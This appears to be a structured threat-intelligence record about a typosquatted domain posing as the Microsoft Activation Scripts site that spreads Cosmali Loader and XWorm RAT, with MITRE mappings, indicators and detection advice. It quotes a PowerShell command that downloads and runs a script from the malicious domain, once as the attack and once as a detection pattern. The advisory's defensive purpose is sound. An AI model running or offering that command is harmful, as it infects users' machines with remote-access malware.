{
  "id": "ff4c1853-7c82-4b0e-8eea-4aa5b5273306",
  "slug": "fake-windows-activation-site-distributes-cosmali-loader-malware",
  "headline": "Typo in Windows Activation Script Leads to Cosmali Loader Malware Infection",
  "title": "Typosquatted Domain Impersonating Microsoft Activation Scripts (MAS) Delivers Cosmali Loader and XWorm RAT",
  "summary": "A typosquatting campaign discovered on December 26, 2025, is targeting users of the popular Microsoft Activation Scripts (MAS) tool. Attackers registered the domain `get.activate[.]win`, a common misspelling of the legitimate domain. Users who mistype the command are redirected to the malicious site, which infects their systems with the Cosmali Loader malware. This loader, in turn, deploys additional payloads, including cryptominers and the XWorm Remote Access Trojan (RAT), giving attackers full control over the victim's machine. In a strange twist, some victims received a pop-up warning them of the infection, believed to be from a third party who hacked the malware's C2 panel.",
  "full_report": "## Executive Summary\nA clever typosquatting campaign is exploiting users of an unofficial but popular open-source tool, **Microsoft Activation Scripts (MAS)**, to distribute malware. Researchers reported on December 26, 2025, that threat actors registered a domain, `get.activate[.]win`, that mimics the legitimate MAS domain by omitting a single letter. Users who make this common typo while executing the activation script in PowerShell are unknowingly infected with **Cosmali Loader**. This malware then deploys secondary payloads, including the **[XWorm](https://malpedia.caad.fkie.fraunhofer.de/details/win.xworm)** Remote Access Trojan (RAT), granting attackers full remote control, and cryptocurrency mining software. The incident highlights the inherent risks of using grey-area tools and the effectiveness of typosquatting as a malware delivery vector.\n\n## Threat Overview\nThe attack preys on human error. The legitimate command to run the MAS script involves invoking a PowerShell command to download and execute a script from `get.activated.win`. The attackers registered `get.activate.win` (missing the 'd').\n\n-   **Attack Vector**: **[Typosquatting](https://en.wikipedia.org/wiki/Typosquatting)**, a form of social engineering that relies on users making typographical errors.\n-   **Execution**: When a user runs the command `irm https://get.activate.win | iex`, they are not connecting to the official MAS project but to the attacker's server.\n-   **Payload**: The server delivers the Cosmali Loader, which establishes persistence and then downloads further malware.\n-   **Final Stage**: The loader deploys the XWorm RAT for remote control and a cryptominer for resource hijacking.\n\nAn unusual aspect of this campaign is that some victims reported receiving a pop-up window that stated, \"You are infected with Cosmali Loader malware because you mistyped the domain name,\" and advised a full Windows reinstall. Security experts speculate this message was not from the attackers but from a vigilante hacker or researcher who compromised the malware's insecure command-and-control (C2) server and used it to warn victims.\n\n## Technical Analysis\n1.  **Initial Access & Execution ([`T1204.002 - User Execution`](https://attack.mitre.org/techniques/T1204/002/))**: The user voluntarily executes the malicious command in PowerShell.\n2.  **Masquerading ([`T1036.005 - Match Legitimate Name or Location`](https://attack.mitre.org/techniques/T1036/005/))**: The domain `get.activate[.]win` is designed to look nearly identical to the legitimate one, tricking the user.\n3.  **Ingress Tool Transfer ([`T1105`](https://attack.mitre.org/techniques/T1105/))**: The `irm` (Invoke-RestMethod) command downloads the initial malware script from the malicious domain.\n4.  **Command and Scripting Interpreter ([`T1059.001 - PowerShell`](https://attack.mitre.org/techniques/T1059/001/))**: The entire attack is initiated and executed via PowerShell, a powerful tool often abused by malware.\n5.  **XWorm RAT Capabilities**: Once deployed, XWorm provides the attacker with full RAT capabilities, including keylogging, file transfer, remote shell access, and credential theft.\n\n## Impact Assessment\nWhile targeting users of a legally questionable tool, the impact can still be severe. Once infected with XWorm RAT, the victim's machine is completely compromised. The attacker can:\n-   Steal personal data, including banking credentials, social media passwords, and private files.\n-   Use the compromised machine as part of a botnet for DDoS attacks or further malware distribution.\n-   Hijack system resources to mine cryptocurrency, leading to high electricity costs and degraded performance.\n-   If the machine is on a corporate network, the attacker can use it as a pivot point to attack other systems.\n\n## IOCs\n| Type | Value | Description |\n|---|---|---|\n| domain | `get.activate[.]win` | The malicious typosquatted domain used to distribute the malware. |\n\n## Detection & Response\n1.  **DNS/Proxy Log Analysis**: Monitor for any connections to the malicious domain `get.activate[.]win`. This is a high-fidelity indicator of compromise. This is an application of **[D3-UA: URL Analysis](https://d3fend.mitre.org/technique/d3f:URLAnalysis)**.\n2.  **PowerShell Script Block Logging**: Enable PowerShell logging (Module Logging, Script Block Logging) to capture the commands being executed. Review logs for the use of `irm` or `iex` fetching scripts from suspicious or unknown domains.\n3.  **Endpoint Monitoring**: Use an EDR solution to detect the behaviors of Cosmali Loader and XWorm RAT, such as creating persistence mechanisms (e.g., scheduled tasks, registry run keys) and injecting into legitimate processes.\n4.  **Network Monitoring**: Monitor for C2 traffic associated with XWorm or unexpected outbound connections from newly installed software.\n\n## Mitigation\n1.  **User Education and Policy**: The primary mitigation is to enforce policies against the use of illegal or unauthorized software and activation tools. Educate users on the risks associated with such tools, including malware infection.\n2.  **DNS Filtering/Web Security Gateway**: Use a web security gateway to block access to known malicious and typosquatted domains. This would prevent the initial download of the malware. This is an example of **[D3-DNSDL: DNS Denylisting](https://d3fend.mitre.org/technique/d3f:DNSDenylisting)**.\n3.  **Restrict PowerShell Usage**: For standard user workstations, consider using PowerShell Constrained Language Mode to limit its ability to execute arbitrary scripts and commands. This is a form of **[D3-ACH: Application Configuration Hardening](https://d3fend.mitre.org/technique/d3f:ApplicationConfigurationHardening)**.\n4.  **Principle of Least Privilege**: Ensure users do not have administrative privileges on their workstations. This can limit the malware's ability to establish persistence and deeply infect the system.",
  "twitter_post": "⚠️ Careful with that copy-paste! A typosquatted domain for Microsoft Activation Scripts (`get.activate[.]win`) is infecting users with Cosmali Loader and XWorm RAT. A single wrong letter leads to full system compromise. #Malware #Typosquatting",
  "meta_description": "A typosquatting campaign targeting users of Microsoft Activation Scripts (MAS) uses a fake domain to distribute Cosmali Loader and XWorm RAT malware.",
  "category": [
    "Malware",
    "Phishing",
    "Threat Actor"
  ],
  "severity": "medium",
  "entities": [
    {
      "name": "Cosmali Loader",
      "type": "malware"
    },
    {
      "name": "XWorm RAT",
      "type": "malware",
      "url": "https://malpedia.caad.fkie.fraunhofer.de/details/win.xworm"
    },
    {
      "name": "Microsoft Activation Scripts (MAS)",
      "type": "product"
    },
    {
      "name": "Microsoft",
      "type": "vendor",
      "url": "https://www.microsoft.com"
    },
    {
      "name": "PowerShell",
      "type": "technology",
      "url": "https://attack.mitre.org/techniques/T1059/001/"
    }
  ],
  "cves": [],
  "sources": [
    {
      "url": "https://www.thaicert.or.th/en/news/2025/12/26/warning-fake-domains-impersonating-mas-used-to-trick-users-into-installing-cosmali-loader-malware.html",
      "title": "Warning: Fake Domains Impersonating MAS Used to Trick Users into Installing Cosmali Loader Malware",
      "date": "2025-12-26",
      "friendly_name": "ThaiCERT",
      "website": "thaicert.or.th"
    },
    {
      "url": "https://www.diesec.com/blog/top-5-cybersecurity-news-stories-december-26-2025",
      "title": "Top 5 Cybersecurity News Stories December 26, 2025",
      "date": "2025-12-26",
      "friendly_name": "DieSec",
      "website": "diesec.com"
    },
    {
      "url": "https://www.scmagazine.com/news/threat-management/new-cosmali-loader-deployed-via-bogus-mas-windows-activation-domain",
      "title": "New Cosmali Loader deployed via bogus MAS Windows activation domain",
      "date": "2025-12-26",
      "friendly_name": "SC Magazine",
      "website": "scmagazine.com"
    }
  ],
  "events": [],
  "mitre_techniques": [
    {
      "id": "T1036.005",
      "name": "Masquerading: Match Legitimate Name or Location",
      "tactic": "Defense Evasion"
    },
    {
      "id": "T1204.002",
      "name": "User Execution: Malicious File",
      "tactic": "Execution"
    },
    {
      "id": "T1059.001",
      "name": "Command and Scripting Interpreter: PowerShell",
      "tactic": "Execution"
    },
    {
      "id": "T1105",
      "name": "Ingress Tool Transfer",
      "tactic": "Command and Control"
    },
    {
      "id": "T1547.001",
      "name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
      "tactic": "Persistence"
    }
  ],
  "mitre_mitigations": [
    {
      "id": "M1017",
      "name": "User Training",
      "description": "Educate users about the dangers of typosquatting and the risks of using unauthorized software activation tools.",
      "domain": "enterprise"
    },
    {
      "id": "M1021",
      "name": "Restrict Web-Based Content",
      "d3fend_techniques": [
        {
          "id": "D3-DNSDL",
          "name": "DNS Denylisting",
          "url": "https://d3fend.mitre.org/technique/d3f:DNSDenylisting"
        }
      ],
      "description": "Use DNS filtering and web security gateways to block access to known malicious and typosquatted domains.",
      "domain": "enterprise"
    },
    {
      "id": "M1038",
      "name": "Execution Prevention",
      "d3fend_techniques": [
        {
          "id": "D3-ACH",
          "name": "Application Configuration Hardening",
          "url": "https://d3fend.mitre.org/technique/d3f:ApplicationConfigurationHardening"
        }
      ],
      "description": "Use PowerShell Constrained Language Mode or other application control mechanisms to prevent the execution of arbitrary scripts.",
      "domain": "enterprise"
    }
  ],
  "d3fend_countermeasures": [
    {
      "technique_id": "D3-DNSDL",
      "technique_name": "DNS Denylisting",
      "url": "https://d3fend.mitre.org/technique/d3f:DNSDenylisting",
      "recommendation": "To proactively block this attack vector, organizations should use a DNS filtering service or web security gateway that maintains a blocklist of known malicious and typosquatted domains. The domain `get.activate[.]win` should be immediately added to this list. These services can prevent the initial PowerShell command (`irm`) from ever reaching the attacker's server, breaking the infection chain at the earliest possible stage. This is a highly effective, low-overhead control that protects against a wide range of phishing and malware delivery campaigns, not just this specific one targeting MAS users.",
      "mitre_mitigation_id": "M1021"
    },
    {
      "technique_id": "D3-ACH",
      "technique_name": "Application Configuration Hardening",
      "url": "https://d3fend.mitre.org/technique/d3f:ApplicationConfigurationHardening",
      "recommendation": "Harden PowerShell configurations on user endpoints to prevent the execution of untrusted scripts. Deploy PowerShell Constrained Language Mode via Group Policy, which severely limits the commands and scripts that can be run. This would prevent the `iex` (Invoke-Expression) part of the attack from executing the downloaded malware script. Additionally, enforce a PowerShell execution policy of 'AllSigned' or 'RemoteSigned' to prevent arbitrary scripts from the internet from running. This hardening measure directly targets the execution phase of the attack and is a best practice for securing Windows environments against fileless malware and living-off-the-land attacks.",
      "mitre_mitigation_id": "M1054"
    },
    {
      "technique_id": "D3-SBC",
      "technique_name": "Security Banner",
      "url": "https://d3fend.mitre.org/technique/d3f:SecurityBanner",
      "recommendation": "While not a technical control in the same vein, the most fundamental mitigation is strong user education and acceptable use policies. Organizations must clearly prohibit the use of unauthorized software, cracks, and activation tools. Conduct security awareness training that specifically covers the dangers of typosquatting and social engineering. Explain that such tools are a primary vector for malware like Cosmali Loader and XWorm RAT. A user who understands the risk is less likely to seek out and execute these commands in the first place, thus avoiding the threat entirely. This cultural and policy-based control is the first line of defense.",
      "mitre_mitigation_id": "M1017"
    }
  ],
  "iocs": [
    {
      "type": "domain",
      "value": "get.activate[.]win",
      "description": "Malicious typosquatted domain impersonating the legitimate MAS domain."
    }
  ],
  "cyber_observables": [
    {
      "type": "command_line_pattern",
      "value": "irm https://get.activate.win",
      "description": "The specific PowerShell command that, when executed, downloads malware from the typosquatted domain.",
      "context": "PowerShell Script Block Logging (Event ID 4104), EDR command line logs",
      "confidence": "high"
    },
    {
      "type": "registry_key",
      "value": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
      "description": "Malware like XWorm RAT often creates registry keys in this location to establish persistence across reboots.",
      "context": "Registry monitoring tools, EDR, Autoruns",
      "confidence": "medium"
    },
    {
      "type": "process_name",
      "value": "RegAsm.exe",
      "description": "Cosmali Loader and other loaders may abuse legitimate Windows binaries like RegAsm.exe to execute malicious code (a LOLBAS technique).",
      "context": "EDR process monitoring, SIEM",
      "confidence": "medium"
    }
  ],
  "tags": [
    "Cosmali Loader",
    "XWorm RAT",
    "Typosquatting",
    "Malware",
    "PowerShell",
    "Microsoft Activation Scripts"
  ],
  "extract_datetime": "2025-12-27T15:00:00.000Z",
  "article_type": "NewsArticle",
  "impact_scope": {
    "geographic_scope": "global",
    "industries_affected": [
      "Other"
    ],
    "other_affected": [
      "Users of Microsoft Activation Scripts (MAS)"
    ]
  },
  "keywords": [
    "Cosmali Loader",
    "XWorm RAT",
    "typosquatting",
    "get.activate.win",
    "Microsoft Activation Scripts",
    "PowerShell malware",
    "malware delivery"
  ],
  "pub_date": "2025-12-27",
  "reading_time_minutes": 4,
  "createdAt": "2025-12-27T15:00:00.000Z",
  "updatedAt": "2025-12-27T15:00:00.000Z"
}